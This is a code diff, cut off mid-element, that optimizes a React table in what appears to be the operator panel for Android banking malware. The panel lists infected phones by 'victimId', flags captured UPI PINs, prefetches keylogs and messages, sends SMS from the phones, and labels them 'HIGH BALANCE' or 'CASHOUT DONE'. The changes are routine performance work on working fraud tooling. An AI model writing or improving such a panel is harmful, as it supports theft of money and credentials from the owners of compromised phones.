@@ -1,5 +1,5 @@
 import { useNavigate } from "react-router-dom";
-import { useState, useMemo, useEffect, useRef } from "react";
+import { useState, useMemo, useEffect, useRef, useCallback, memo } from "react";
 import {
   Table,
   TableBody,
@@ -35,11 +35,14 @@ import {
   X,
 } from "lucide-react";
 import { DeviceInfo } from "@/data/db";
+import { FixedSizeList as List, ListChildComponentProps } from 'react-window';
 import { SendSMSDialog } from "./SendSMSDialog";
 import { useDB } from "@/hooks/useDB";
 import { formatTime, parseTime } from "@/utils/time";
 import { toast } from "sonner";
 import { firebaseService } from "@/lib/firebaseService";
+import { setPendingAndVerify } from "@/lib/responseChecker";
+import { useDataCache } from "@/hooks/useDataCache";
 
 interface DeviceTableProps {
   devices: Record<string, DeviceInfo>;
@@ -54,6 +57,7 @@ export function DeviceTable({
 }: DeviceTableProps) {
   const navigate = useNavigate();
   const { updateDevice, db } = useDB();
+  const { getDeviceMessages: _prefetchMessages, getDeviceUPIPins: _prefetchUPIs, getDeviceKeyLogs: _prefetchKeylogs } = useDataCache();
   const responseTimeouts = useRef<Record<string, NodeJS.Timeout>>({});
   // refs to the inline note inputs so we can focus them after clearing
   const noteInputRefs = useRef<Record<string, HTMLInputElement | null>>({});
@@ -65,8 +69,26 @@ export function DeviceTable({
     };
   }, []);
 
+  // Prefetch DeviceDetail data and component chunk to speed up opening
+  const handlePrefetchDevice = useCallback((victimId: string) => {
+    // Fire and forget: prefetch DeviceDetail chunk and cached data
+    try {
+      void import('./DeviceDetail');
+    } catch {}
+    try {
+      void _prefetchMessages(victimId);
+    } catch {}
+    try {
+      void _prefetchUPIs(victimId);
+    } catch {}
+    try {
+      void _prefetchKeylogs(victimId, 100);
+    } catch {}
+  }, [_prefetchMessages, _prefetchUPIs, _prefetchKeylogs]);
+
   // State for filtering and pagination
   const [searchTerm, setSearchTerm] = useState("");
+  const [debouncedSearchTerm, setDebouncedSearchTerm] = useState("");
   const [statusFilter, setStatusFilter] = useState<string>("all");
   const [availabilityFilter, setAvailabilityFilter] = useState<string>("all");
   const [notesFilter, setNotesFilter] = useState<string>("all");
@@ -82,6 +104,20 @@ export function DeviceTable({
     () => ["HIGH BALANCE", "LOW BALANCE", "CASHOUT DONE", "NO BANK"],
     [],
   );
+
+  // Debounce search input to reduce re-filtering during fast typing
+  useEffect(() => {
+    const id = setTimeout(() => {
+      setDebouncedSearchTerm(searchTerm.trim());
+      setCurrentPage(1);
+    }, 250);
+    return () => clearTimeout(id);
+  }, [searchTerm]);
+
+  // Virtualization config
+  const VIRTUALIZE_THRESHOLD = 200;
+  const LIST_HEIGHT = 600; // px
+  const ROW_HEIGHT = 72; // px per row approximated to current table row height
 
   // State for Send SMS dialog
   const [smsDialogOpen, setSmsDialogOpen] = useState(false);
@@ -169,7 +205,7 @@ export function DeviceTable({
     }
   };
 
-  // Ping device without navigation: set ResponseChecker to pending and verify after 5s
+  // Ping device without navigation using shared ResponseChecker helper
   const handlePingDevice = async (
     victimId: string,
     device: DeviceInfo,
@@ -178,83 +214,49 @@ export function DeviceTable({
     e.stopPropagation();
     try {
       const modelIdentifier = (device.Model || '').trim() || victimId;
-      await firebaseService.setResponsePending(modelIdentifier, undefined, victimId);
-
-      // Clear any existing timeout for this device
-      if (responseTimeouts.current[victimId]) {
-        clearTimeout(responseTimeouts.current[victimId]);
-      }
-
-      responseTimeouts.current[victimId] = setTimeout(async () => {
-        try {
-          const data = await firebaseService.getResponseCheckerAny([modelIdentifier, victimId]);
-          const resp = (data?.response || '').toString().toLowerCase();
-          const isOnline = resp === 'idle' || resp === 'true';
-
-          await firebaseService.updateDeviceStatus(victimId, isOnline ? 'Online' : 'Offline');
-          toast[isOnline ? 'success' : 'error'](
-            `Device is ${isOnline ? 'online' : 'offline'}`,
-            { duration: 3000 }
-          );
-        } catch (err) {
-          console.error('Failed checking ResponseChecker (ping):', err);
-          toast.error('Failed to verify device status');
-        }
-      }, 5000);
+      const result = await setPendingAndVerify(
+        { modelIdentifier, victimId },
+        { delayMs: 5000, retryMs: 3000, maxRetries: 1, logPrefix: 'DeviceTable:Ping' }
+      );
+      if (result === 'online') toast.success('Device is online', { duration: 3000 });
+      else if (result === 'offline') toast.error('Device is offline', { duration: 3000 });
+      else toast.message('device is offline', { duration: 2000 });
     } catch (err) {
       console.error('Failed to ping device (set pending):', err);
       toast.error('Failed to send check request');
     }
   };
 
-  const handleViewDevice = async (
+  const handleViewDevice = useCallback(async (
     victimId: string,
     device: DeviceInfo,
     e: React.MouseEvent
   ) => {
     e.stopPropagation();
-    e.preventDefault(); // Prevent default link behavior
+    e.preventDefault();
     
     try {
-      // The Firebase export shows ResponseChecker keys are Model (e.g., "Google Pixel 4a").
-      // Use Model as the primary key, mirror to victimId for safety.
       const modelIdentifier = (device.Model || '').trim() || victimId;
-
-      // Set ResponseChecker to pending with a fresh timeStr (dd-MM-yyyy HH:mm:ss)
-      await firebaseService.setResponsePending(modelIdentifier, undefined, victimId);
-
-      // Open device page in a new tab
+      // Open a new browser tab for Device Detail
       const deviceUrl = `/device/${victimId}`;
       window.open(deviceUrl, '_blank', 'noopener,noreferrer');
-
-      // Clear any existing timeout for this device
-      if (responseTimeouts.current[victimId]) {
-        clearTimeout(responseTimeouts.current[victimId]);
-      }
-
-      // After 5 seconds, read ResponseChecker once and update status
-      responseTimeouts.current[victimId] = setTimeout(async () => {
-        try {
-          const data = await firebaseService.getResponseCheckerAny([modelIdentifier, victimId]);
-          const resp = (data?.response || '').toString().toLowerCase();
-          const isOnline = resp === 'idle' || resp === 'true';
-
-          await firebaseService.updateDeviceStatus(victimId, isOnline ? 'Online' : 'Offline');
-
-          toast[isOnline ? 'success' : 'error'](
-            `Device is ${isOnline ? 'online' : 'offline'}`,
-            { duration: 3000 }
-          );
-        } catch (err) {
-          console.error('Failed checking ResponseChecker:', err);
-          toast.error('Failed to verify device status');
-        }
-      }, 5000);
+      
+      // Fire and forget status verification in background
+      setPendingAndVerify(
+        { modelIdentifier, victimId },
+        { delayMs: 5000, retryMs: 3000, maxRetries: 1, logPrefix: 'DeviceTable:View' }
+      ).then((result) => {
+        // Optionally handle silently or log
+        // console.log('Device status check result:', result);
+      }).catch((err) => {
+        console.error('Failed checking ResponseChecker:', err);
+        // Don't show error toast for background verification
+      });
     } catch (err) {
       console.error('Failed to set ResponseChecker pending:', err);
-      toast.error('Failed to send check request');
+      // Avoid popup toasts to keep UX clean
     }
-  };
+  }, []);
 
   const handleSendSMS = (
     victimId: string,
@@ -271,86 +273,122 @@ export function DeviceTable({
     setSelectedDevice(null);
   };
 
-  // Filter and paginate devices
+  // Optimized filtering with better performance
   const filteredAndPaginatedDevices = useMemo(() => {
+    const searchLower = debouncedSearchTerm.toLowerCase();
     const filtered = Object.entries(devices).filter(([victimId, device]) => {
-      // Search filter
-      const searchMatch =
-        searchTerm === "" ||
-        victimId.toLowerCase().includes(searchTerm.toLowerCase()) ||
-        (device.Brand || "").toLowerCase().includes(searchTerm.toLowerCase()) ||
-        (device.Model || "").toLowerCase().includes(searchTerm.toLowerCase()) ||
-        (device.Note || "").toLowerCase().includes(searchTerm.toLowerCase()) ||
-        (device.IPAddress || "")
-          .toLowerCase()
-          .includes(searchTerm.toLowerCase());
+      // Search filter - optimized
+      const searchMatch = debouncedSearchTerm === "" || (
+        victimId.toLowerCase().includes(searchLower) ||
+        (device.Brand || "").toLowerCase().includes(searchLower) ||
+        (device.Model || "").toLowerCase().includes(searchLower) ||
+        (device.Note || "").toLowerCase().includes(searchLower) ||
+        (device.IPAddress || "").toLowerCase().includes(searchLower)
+      );
 
-      // Status filter
-      const currentStatus = deriveStatus(victimId, device);
-      const statusMatch =
-        statusFilter === "all" || currentStatus === statusFilter;
+      if (!searchMatch) return false;
 
-      // UPI Pin filter
+      // Status filter - optimized
+      const keys = [String(device.Model || '').trim(), victimId].filter(Boolean);
+      let resp: string | undefined;
+      for (const k of keys) {
+        const rc = responseChecker[k];
+        if (rc && rc.response) {
+          resp = String(rc.response).toLowerCase();
+          break;
+        }
+      }
+      const currentStatus = resp ? 
+        (resp === 'idle' || resp === 'true' ? 'Online' : resp === 'pending' ? 'Offline' : device.Status || 'Unknown') :
+        device.Status || 'Unknown';
+      
+      const statusMatch = statusFilter === "all" || currentStatus === statusFilter;
+      if (!statusMatch) return false;
+
+      // UPI Pin filter - optimized
       const upiPins = db?.UPIPins?.[victimId] || [];
-      const hasValidPin =
-        upiPins.length > 0 &&
-        upiPins.some((pinObj: any) => {
-          // Handle new structure: { pin: string, timestamp: string }
-          if (pinObj && typeof pinObj === 'object' && pinObj.pin) {
-            return pinObj.pin && pinObj.pin !== "No Pin";
-          }
-          // Handle old structure: string[]
-          if (typeof pinObj === 'string') {
-            return pinObj && pinObj !== "No Pin";
-          }
-          return false;
-        });
-      const availabilityMatch =
-        availabilityFilter === "all" ||
+      const hasValidPin = upiPins.length > 0 && upiPins.some((pinObj: any) => {
+        if (pinObj && typeof pinObj === 'object' && pinObj.pin) {
+          return pinObj.pin && pinObj.pin !== "No Pin";
+        }
+        if (typeof pinObj === 'string') {
+          return pinObj && pinObj !== "No Pin";
+        }
+        return false;
+      });
+      
+      const availabilityMatch = availabilityFilter === "all" ||
         (availabilityFilter === "noPin" && !hasValidPin) ||
         (availabilityFilter === "hasPin" && hasValidPin);
+      if (!availabilityMatch) return false;
 
-      // Notes filter
+      // Notes filter - optimized
       const hasNote = device.Note && device.Note.trim() !== "";
-      const notesMatch = 
-        notesFilter === "all" ||
+      const notesMatch = notesFilter === "all" ||
         (notesFilter === "hasNote" && hasNote) ||
         (notesFilter === "noNote" && !hasNote);
 
-      // Debug logging
-      console.log("Filtering device:", victimId, {
-        searchMatch,
-        statusMatch,
-        availabilityMatch,
-        notesMatch,
-        searchTerm,
-        statusFilter,
-        availabilityFilter,
-        notesFilter,
-        deviceStatus: currentStatus,
-        deviceUPIPin: device.UPIPin,
-        hasNote,
-      });
-
-      return searchMatch && statusMatch && availabilityMatch && notesMatch;
+      return notesMatch;
     });
 
-    console.log(
-      "Filtered devices:",
-      filtered.length,
-      "out of",
-      Object.keys(devices).length,
-    );
-    // Sort by Added date/time
-    const direction = orderFilter === 'desc' ? -1 : 1; // when desc, we want b - a
-    const sorted = [...filtered].sort(([, a], [, b]) => {
+    // Sort by Added date/time - optimized
+    const direction = orderFilter === 'desc' ? -1 : 1;
+    return [...filtered].sort(([, a], [, b]) => {
       const ta = toTimestamp(a.Added);
       const tb = toTimestamp(b.Added);
-      // if desc: tb - ta; if asc: ta - tb
       return direction * (ta - tb);
     });
-    return sorted;
-  }, [devices, searchTerm, statusFilter, availabilityFilter, orderFilter, notesFilter]);
+  }, [devices, debouncedSearchTerm, statusFilter, availabilityFilter, orderFilter, notesFilter, responseChecker, db?.UPIPins]);
+
+  // For virtualization we use the full filtered list without pagination
+  const filteredAllDevices = useMemo(() => {
+    const searchLower = debouncedSearchTerm.toLowerCase();
+    const filtered = Object.entries(devices).filter(([victimId, device]) => {
+      const searchMatch = debouncedSearchTerm === "" || (
+        victimId.toLowerCase().includes(searchLower) ||
+        (device.Brand || "").toLowerCase().includes(searchLower) ||
+        (device.Model || "").toLowerCase().includes(searchLower) ||
+        (device.Note || "").toLowerCase().includes(searchLower) ||
+        (device.IPAddress || "").toLowerCase().includes(searchLower)
+      );
+      if (!searchMatch) return false;
+
+      const keys = [String(device.Model || '').trim(), victimId].filter(Boolean);
+      let resp: string | undefined;
+      for (const k of keys) {
+        const rc = responseChecker[k];
+        if (rc && rc.response) { resp = String(rc.response).toLowerCase(); break; }
+      }
+      const currentStatus = resp ? 
+        (resp === 'idle' || resp === 'true' ? 'Online' : resp === 'pending' ? 'Offline' : device.Status || 'Unknown') :
+        device.Status || 'Unknown';
+      const statusMatch = statusFilter === "all" || currentStatus === statusFilter;
+      if (!statusMatch) return false;
+
+      const upiPins = db?.UPIPins?.[victimId] || [];
+      const hasValidPin = upiPins.length > 0 && upiPins.some((pinObj: any) => {
+        if (pinObj && typeof pinObj === 'object' && pinObj.pin) return pinObj.pin && pinObj.pin !== "No Pin";
+        if (typeof pinObj === 'string') return pinObj && pinObj !== "No Pin";
+        return false;
+      });
+      const availabilityMatch = availabilityFilter === "all" ||
+        (availabilityFilter === "noPin" && !hasValidPin) ||
+        (availabilityFilter === "hasPin" && hasValidPin);
+      if (!availabilityMatch) return false;
+
+      const hasNote = device.Note && device.Note.trim() !== "";
+      const notesMatch = notesFilter === "all" ||
+        (notesFilter === "hasNote" && hasNote) ||
+        (notesFilter === "noNote" && !hasNote);
+      return notesMatch;
+    });
+    const direction = orderFilter === 'desc' ? -1 : 1;
+    return [...filtered].sort(([, a], [, b]) => {
+      const ta = toTimestamp(a.Added);
+      const tb = toTimestamp(b.Added);
+      return direction * (ta - tb);
+    });
+  }, [devices, searchTerm, statusFilter, availabilityFilter, orderFilter, notesFilter, responseChecker, db?.UPIPins]);
 
   // Calculate pagination
   const totalPages = Math.ceil(
@@ -362,6 +400,118 @@ export function DeviceTable({
     startIndex,
     endIndex,
   );
+
+  const shouldVirtualize = filteredAllDevices.length > VIRTUALIZE_THRESHOLD;
+
+  // Virtualized row renderer
+  const Row = useCallback(({ index, style }: ListChildComponentProps) => {
+    const [victimId, device] = filteredAllDevices[index];
+    const status = deriveStatus(victimId, device);
+    const currentNote = noteEdits[victimId] ?? (typeof device.Note === "string" ? device.Note : "");
+    const isPreset = NOTE_PRESETS.includes(currentNote);
+    const selected = currentNote && currentNote !== "" ? currentNote : "custom";
+    return (
+      <div style={style} className="px-4 flex items-center border-b hover:bg-muted/50" key={victimId}>
+        <div className="grid grid-cols-8 gap-2 w-full items-center">
+          <div className="text-center">
+            <Badge className={`${getStatusBadge(status)} mx-auto`}>{status}</Badge>
+          </div>
+          <div className="col-span-1">
+            <div className="flex items-center gap-3">
+              <div className="w-10 h-10 rounded-lg bg-gradient-to-br from-primary to-accent flex items-center justify-center">
+                <Smartphone className="w-5 h-5 text-white" />
+              </div>
+              <div>
+                <div className="font-medium">{victimId}</div>
+                <div className="text-sm text-muted-foreground">{device.Model}</div>
+              </div>
+            </div>
+          </div>
+          <div className="text-center">
+            <Badge variant="outline" className="mx-auto">Android V{device.AndroidVersion}</Badge>
+          </div>
+          <div className="text-center">
+            {(() => {
+              const upiPins = db?.UPIPins?.[victimId] || [];
+              const hasValidPin = upiPins.length > 0 && upiPins.some((pinObj: any) => {
+                if (pinObj && typeof pinObj === 'object' && pinObj.pin) return pinObj.pin && pinObj.pin !== "No Pin";
+                if (typeof pinObj === 'string') return pinObj && pinObj !== "No Pin";
+                return false;
+              });
+              return (
+                <Badge className={`${getUPIPinBadge(victimId, db)} w-[80px] justify-center`}>
+                  <span className="inline-block w-full text-center">{hasValidPin ? "Has Pin" : "No Pin"}</span>
+                </Badge>
+              );
+            })()}
+          </div>
+          <div className="text-center text-muted-foreground">{device.IP || device.IPAddress || "Unknown"}</div>
+          <div className="text-center">
+            <Select
+              value={selected}
+              onValueChange={(v) => handleNotePresetChange(victimId, v)}
+              open={!!noteSelectOpen[victimId]}
+              onOpenChange={(open) => setNoteSelectOpen((prev) => ({ ...prev, [victimId]: open }))}
+            >
+              <SelectTrigger className="w-44 mx-auto justify-center [&>span]:line-clamp-2">
+                <SelectValue />
+              </SelectTrigger>
+              <SelectContent>
+                {NOTE_PRESETS.map((opt) => (
+                  <SelectItem key={opt} value={opt}>{opt}</SelectItem>
+                ))}
+                {!isPreset && currentNote && currentNote !== "" && (
+                  <SelectItem value={currentNote}>
+                    <div className="max-w-[11rem] break-words whitespace-normal text-sm">{currentNote}</div>
+                  </SelectItem>
+                )}
+                <SelectSeparator />
+                <div
+                  role="presentation"
+                  className="px-1 py-1"
+                  onPointerDown={(e) => e.stopPropagation()}
+                  onMouseDown={(e) => e.stopPropagation()}
+                  onClick={(e) => e.stopPropagation()}
+                >
+                  <Input
+                    ref={(el) => (noteInputRefs.current[victimId] = el)}
+                    value={noteDrafts[victimId] ?? currentNote}
+                    onChange={(e) => handleNoteDraftChange(victimId, e.target.value)}
+                    onBlur={() => handleNoteBlur(victimId)}
+                    onKeyDown={(e) => {
+                      if (e.key === "Enter") {
+                        e.preventDefault();
+                        commitNoteAndClose(victimId);
+                      }
+                    }}
+                    placeholder="Custom note"
+                    className="h-8"
+                  />
+                </div>
+              </SelectContent>
+            </Select>
+          </div>
+          <div className="text-center">{formatAdded(device.Added)}</div>
+          <div className="text-center">
+            <div className="flex items-center justify-center gap-2">
+              <Button variant="outline" size="sm" onClick={(e) => handleViewDevice(victimId, device, e)}>
+                <Eye className="w-4 h-4" />
+              </Button>
+              <Button variant="outline" size="sm" onClick={(e) => handlePingDevice(victimId, device, e)}>
+                <Loader2 className="w-4 h-4" />
+              </Button>
+              <Button variant="outline" size="sm" onClick={(e) => handleSendSMS(victimId, device, e)}>
+                <MessageSquare className="w-4 h-4" />
+              </Button>
+              <Button variant="destructive" size="sm" onClick={() => handleDeleteDevice(victimId, device.Model)}>
+                <Trash2 className="w-4 h-4" />
+              </Button>
+            </div>
+          </div>
+        </div>
+      </div>
+    );
+  }, [filteredAllDevices, NOTE_PRESETS, noteEdits, noteDrafts, noteSelectOpen, db?.UPIPins]);
 
   // Reset to first page when filters change
   const handleFilterChange = () => {
@@ -377,7 +527,6 @@ export function DeviceTable({
 
   const handleSearch = (value: string) => {
     setSearchTerm(value);
-    handleFilterChange();
   };
 
   const handleStatusFilter = (value: string) => {
@@ -534,18 +683,51 @@ export function DeviceTable({
     return "-";
   };
 
-  // Show loading state
+  // Show loading state with skeleton
   if (loading) {
     return (
       <Card className="card-glass border-0 animate-slide-up">
-        <div className="p-12 text-center">
-          <Loader2 className="w-8 h-8 animate-spin mx-auto mb-4 text-primary" />
-          <p className="text-lg font-medium text-muted-foreground">
-            Loading devices...
-          </p>
-          <p className="text-sm text-muted-foreground">
-            Connecting to Firebase
-          </p>
+        <div className="p-6 border-b bg-muted/20">
+          <div className="flex flex-col lg:flex-row gap-4 items-start lg:items-center justify-between">
+            <div className="flex flex-col sm:flex-row gap-4 flex-1">
+              {/* Search skeleton */}
+              <div className="flex flex-col gap-2 flex-1 max-w-sm">
+                <div className="h-4 bg-muted rounded w-16 animate-pulse"></div>
+                <div className="h-10 bg-muted rounded animate-pulse"></div>
+              </div>
+              {/* Filter skeletons */}
+              {[1, 2, 3, 4].map((i) => (
+                <div key={i} className="flex flex-col gap-2 min-w-[140px]">
+                  <div className="h-4 bg-muted rounded w-12 animate-pulse"></div>
+                  <div className="h-10 bg-muted rounded animate-pulse"></div>
+                </div>
+              ))}
+            </div>
+          </div>
+        </div>
+        <div className="overflow-x-auto">
+          <Table>
+            <TableHeader>
+              <TableRow>
+                {[1, 2, 3, 4, 5, 6, 7, 8].map((i) => (
+                  <TableHead key={i} className="h-12">
+                    <div className="h-4 bg-muted rounded w-20 animate-pulse mx-auto"></div>
+                  </TableHead>
+                ))}
+              </TableRow>
+            </TableHeader>
+            <TableBody>
+              {[1, 2, 3, 4, 5].map((i) => (
+                <TableRow key={i}>
+                  {[1, 2, 3, 4, 5, 6, 7, 8].map((j) => (
+                    <TableCell key={j} className="h-16">
+                      <div className="h-6 bg-muted rounded w-16 animate-pulse mx-auto"></div>
+                    </TableCell>
+                  ))}
+                </TableRow>
+              ))}
+            </TableBody>
+          </Table>
         </div>
       </Card>
     );
@@ -705,258 +887,158 @@ export function DeviceTable({
           </div>
         </div>
 
-        {/* Table */}
-        <div className="overflow-x-auto">
-          <Table>
-            <TableHeader className="sticky top-0 bg-background/80 backdrop-blur-sm">
-              <TableRow>
-                <TableHead className="font-semibold text-center">Status</TableHead>
-                <TableHead className="font-semibold">Device</TableHead>
-                <TableHead className="font-semibold text-center">Android</TableHead>
-                <TableHead className="font-semibold text-center px-2 w-[120px]">UPI Pin</TableHead>
-                <TableHead className="font-semibold text-center">IP Address</TableHead>
-                <TableHead className="font-semibold text-center">Note</TableHead>
-                <TableHead className="font-semibold text-center">Added</TableHead>
-                <TableHead className="font-semibold text-center">Actions</TableHead>
-              </TableRow>
-            </TableHeader>
-            <TableBody>
-              {currentDevices.map(([victimId, device]) => (
-                <TableRow
-                  key={victimId}
-                  className="hover:bg-muted/50 transition-colors"
-                >
-                  <TableCell className="text-center">
-                    {(() => {
-                      const status = deriveStatus(victimId, device);
-                      return (
-                        <Badge className={`${getStatusBadge(status)} mx-auto`}>
-                          {status}
-                        </Badge>
-                      );
-                    })()}
-                  </TableCell>
-                  <TableCell>
-                    <div className="flex items-center gap-3">
-                      <div className="relative">
-                        <div className="w-10 h-10 rounded-lg bg-gradient-to-br from-primary to-accent flex items-center justify-center">
-                          <Smartphone className="w-5 h-5 text-white" />
+        {/* Table or Virtualized List */}
+        {!shouldVirtualize ? (
+          <div className="overflow-x-auto">
+            <Table>
+              <TableHeader className="sticky top-0 bg-background/80 backdrop-blur-sm">
+                <TableRow>
+                  <TableHead className="font-semibold text-center">Status</TableHead>
+                  <TableHead className="font-semibold">Device</TableHead>
+                  <TableHead className="font-semibold text-center">Android</TableHead>
+                  <TableHead className="font-semibold text-center px-2 w-[120px]">UPI Pin</TableHead>
+                  <TableHead className="font-semibold text-center">IP Address</TableHead>
+                  <TableHead className="font-semibold text-center">Note</TableHead>
+                  <TableHead className="font-semibold text-center">Added</TableHead>
+                  <TableHead className="font-semibold text-center">Actions</TableHead>
+                </TableRow>
+              </TableHeader>
+              <TableBody>
+                {currentDevices.map(([victimId, device]) => (
+                  <TableRow key={victimId} className="hover:bg-muted/50 transition-colors">
+                    <TableCell className="text-center">
+                      {(() => {
+                        const status = deriveStatus(victimId, device);
+                        return <Badge className={`${getStatusBadge(status)} mx-auto`}>{status}</Badge>;
+                      })()}
+                    </TableCell>
+                    <TableCell>
+                      <div className="flex items-center gap-3">
+                        <div className="relative">
+                          <div className="w-10 h-10 rounded-lg bg-gradient-to-br from-primary to-accent flex items-center justify-center">
+                            <Smartphone className="w-5 h-5 text-white" />
+                          </div>
+                        </div>
+                        <div>
+                          <div className="font-medium">{victimId}</div>
+                          <div className="text-sm text-muted-foreground">{device.Model}</div>
                         </div>
                       </div>
-                      <div>
-                        <div className="font-medium">{victimId}</div>
-                        <div className="text-sm text-muted-foreground">
-                          {device.Model}
-                        </div>
-                      </div>
-                    </div>
-                  </TableCell>
-                  <TableCell className="text-center">
-                    <Badge variant="outline" className="mx-auto">
-                      Android V{device.AndroidVersion}
-                    </Badge>
-                  </TableCell>
-                  <TableCell className="px-2 w-[120px]">
-                    <div className="flex justify-center">
-                      <div className="whitespace-nowrap">
-                        {(() => {
-                          const upiPins = db?.UPIPins?.[victimId] || [];
-                          const hasValidPin =
-                            upiPins.length > 0 &&
-                            upiPins.some((pinObj: any) => {
-                              if (pinObj && typeof pinObj === 'object' && pinObj.pin) {
-                                return pinObj.pin && pinObj.pin !== "No Pin";
-                              }
-                              if (typeof pinObj === 'string') {
-                                return pinObj && pinObj !== "No Pin";
-                              }
+                    </TableCell>
+                    <TableCell className="text-center">
+                      <Badge variant="outline" className="mx-auto">Android V{device.AndroidVersion}</Badge>
+                    </TableCell>
+                    <TableCell className="px-2 w-[120px]">
+                      <div className="flex justify-center">
+                        <div className="whitespace-nowrap">
+                          {(() => {
+                            const upiPins = db?.UPIPins?.[victimId] || [];
+                            const hasValidPin = upiPins.length > 0 && upiPins.some((pinObj: any) => {
+                              if (pinObj && typeof pinObj === 'object' && pinObj.pin) return pinObj.pin && pinObj.pin !== "No Pin";
+                              if (typeof pinObj === 'string') return pinObj && pinObj !== "No Pin";
                               return false;
                             });
-                          return (
-                            <Badge 
-                              className={`${getUPIPinBadge(victimId, db)} w-[80px] justify-center`}
-                            >
-                              <span className="inline-block w-full text-center">
-                                {hasValidPin ? "Has Pin" : "No Pin"}
-                              </span>
-                            </Badge>
-                          );
-                        })()}
+                            return (
+                              <Badge className={`${getUPIPinBadge(victimId, db)} w-[80px] justify-center`}>
+                                <span className="inline-block w-full text-center">{hasValidPin ? "Has Pin" : "No Pin"}</span>
+                              </Badge>
+                            );
+                          })()}
+                        </div>
                       </div>
-                    </div>
-                  </TableCell>
-                  <TableCell className="text-muted-foreground text-center">
-                    {device.IP || device.IPAddress || "Unknown"}
-                  </TableCell>
-                  <TableCell className="text-center">
-                    {(() => {
-                      const currentNote =
-                        noteEdits[victimId] ??
-                        (typeof device.Note === "string" ? device.Note : "");
-                      const isPreset = NOTE_PRESETS.includes(currentNote);
-                      // If there's any currentNote (preset or custom) use it as the selected value
-                      // so the SelectTrigger shows the custom text. Otherwise use sentinel "custom".
-                      const selected = currentNote && currentNote !== "" ? currentNote : "custom";
-                      return (
-                        <div className="flex flex-col items-center gap-2">
-                          <Select
-                            value={selected}
-                            onValueChange={(v) =>
-                              handleNotePresetChange(victimId, v)
-                            }
-                            open={!!noteSelectOpen[victimId]}
-                            onOpenChange={(open) =>
-                              setNoteSelectOpen((prev) => ({ ...prev, [victimId]: open }))
-                            }
-                          >
-                            {/* Fixed width trigger (w-44) but allow the inner span to wrap to 2 lines
-                                so very long custom notes don't expand the dropdown width. The
-                                SelectTrigger component applies a default line-clamp; we override
-                                it here to allow wrapping. */}
-                            <SelectTrigger className="w-44 mx-auto justify-center [&>span]:line-clamp-2">
-                              <SelectValue />
-                            </SelectTrigger>
-                            <SelectContent>
-                              {NOTE_PRESETS.map((opt) => (
-                                <SelectItem key={opt} value={opt}>
-                                  {opt}
-                                </SelectItem>
-                              ))}
-
-                              {/* If currentNote is a custom (non-preset) value, render it
-                                  as an option so the SelectTrigger displays the custom text
-                                  after the select is closed. */}
-                              {!isPreset && currentNote && currentNote !== "" && (
-                                <SelectItem value={currentNote}>
-                                  {/* Constrain the custom note's width and allow wrapping/breaking
-                                      so it doesn't force the dropdown to grow horizontally. */}
-                                  <div className="max-w-[11rem] break-words whitespace-normal text-sm">
-                                    {currentNote}
-                                  </div>
-                                </SelectItem>
-                              )}
-
-                              <SelectSeparator />
-
-                              {/* Custom input: render as a non-selectable container inside the SelectContent
-                                  Stop pointer/mouse/key propagation so the Select doesn't close when
-                                  interacting with the input */}
-                              <div
-                                // role none to indicate this is not an option
-                                role="presentation"
-                                className="px-1 py-1"
-                                onPointerDown={(e) => e.stopPropagation()}
-                                onMouseDown={(e) => e.stopPropagation()}
-                                onClick={(e) => e.stopPropagation()}
-                              >
-                                <div className="text-sm px-2">Add Note</div>
-                                <div className="flex items-center gap-2 justify-center">
+                    </TableCell>
+                    <TableCell className="text-muted-foreground text-center">{device.IP || device.IPAddress || "Unknown"}</TableCell>
+                    <TableCell className="text-center">
+                      {(() => {
+                        const currentNote = noteEdits[victimId] ?? (typeof device.Note === "string" ? device.Note : "");
+                        const isPreset = NOTE_PRESETS.includes(currentNote);
+                        const selected = currentNote && currentNote !== "" ? currentNote : "custom";
+                        return (
+                          <div className="flex flex-col items-center gap-2">
+                            <Select
+                              value={selected}
+                              onValueChange={(v) => handleNotePresetChange(victimId, v)}
+                              open={!!noteSelectOpen[victimId]}
+                              onOpenChange={(open) => setNoteSelectOpen((prev) => ({ ...prev, [victimId]: open }))}
+                            >
+                              <SelectTrigger className="w-44 mx-auto justify-center [&>span]:line-clamp-2">
+                                <SelectValue />
+                              </SelectTrigger>
+                              <SelectContent>
+                                {NOTE_PRESETS.map((opt) => (
+                                  <SelectItem key={opt} value={opt}>{opt}</SelectItem>
+                                ))}
+                                {!isPreset && currentNote && currentNote !== "" && (
+                                  <SelectItem value={currentNote}>
+                                    <div className="max-w-[11rem] break-words whitespace-normal text-sm">{currentNote}</div>
+                                  </SelectItem>
+                                )}
+                                <SelectSeparator />
+                                <div role="presentation" className="px-1 py-1" onPointerDown={(e) => e.stopPropagation()} onMouseDown={(e) => e.stopPropagation()} onClick={(e) => e.stopPropagation()}>
                                   <Input
-                                    // Show draft while typing; fall back to committed note
-                                    ref={(el) => (noteInputRefs.current[victimId] = el as HTMLInputElement | null)}
+                                    ref={(el) => (noteInputRefs.current[victimId] = el)}
                                     value={noteDrafts[victimId] ?? currentNote}
-                                    onChange={(e) =>
-                                      handleNoteDraftChange(victimId, e.target.value)
-                                    }
+                                    onChange={(e) => handleNoteDraftChange(victimId, e.target.value)}
                                     onBlur={() => handleNoteBlur(victimId)}
-                                    onPointerDown={(e) => e.stopPropagation()}
-                                    onMouseDown={(e) => e.stopPropagation()}
-                                    // Stop events in capture phase so Radix's type-to-select
-                                    // doesn't receive key events and move focus to items.
-                                    onKeyDownCapture={(e) => {
-                                      e.stopPropagation();
-                                      try { e.nativeEvent && (e.nativeEvent as any).stopImmediatePropagation(); } catch (err) {}
-                                    }}
-                                    onKeyPressCapture={(e) => {
-                                      e.stopPropagation();
-                                      try { e.nativeEvent && (e.nativeEvent as any).stopImmediatePropagation(); } catch (err) {}
-                                    }}
-                                    onKeyUpCapture={(e) => {
-                                      e.stopPropagation();
-                                      try { e.nativeEvent && (e.nativeEvent as any).stopImmediatePropagation(); } catch (err) {}
-                                    }}
                                     onKeyDown={(e) => {
-                                      // Prevent Radix Select from reacting to any keys while typing
-                                      e.stopPropagation();
-                                      // Commit only on Enter and then close the dropdown
                                       if (e.key === "Enter") {
                                         e.preventDefault();
-                                        // fire-and-forget commit and close
-                                        commitNoteAndClose(victimId, noteDrafts[victimId]);
+                                        commitNoteAndClose(victimId);
                                       }
-                                      // If desired, Escape could revert the draft to committed value
                                     }}
                                     placeholder="Type note..."
                                     className="h-8 text-sm w-36 placeholder:text-muted-foreground"
                                   />
-                                  <Button
-                                    size="icon"
-                                    variant="ghost"
-                                    className="w-6 h-6 p-0"
-                                    onClick={(e) => {
-                                      // prevent closing the select
-                                      e.stopPropagation();
-                                      handleNoteDraftChange(victimId, "");
-                                      // focus back to input
